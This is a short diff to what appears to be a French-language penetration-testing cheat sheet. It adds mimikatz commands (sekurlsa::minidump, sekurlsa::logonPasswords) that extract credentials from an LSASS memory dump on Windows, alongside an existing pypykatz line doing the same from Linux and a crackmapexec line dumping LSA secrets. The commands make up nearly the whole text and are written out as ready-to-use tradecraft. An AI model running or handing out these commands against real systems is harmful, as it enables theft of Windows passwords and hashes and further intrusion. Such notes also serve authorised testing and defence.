@@ -28,5 +28,10 @@ crackmapexec smb $TARGET_IP --local-auth -u $LOCAL_USER -p $LOCAL_PASS --lsa
 ## Extraction d'informations d'identification
 
 ```
+# depuis windows dans mimikatz : (ne touche qu'au dump, pas au precessus)
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonPasswords
+
+# depuis linux
 pypykatz lsa minidump /home/peter/Documents/lsass.dmp
 ```
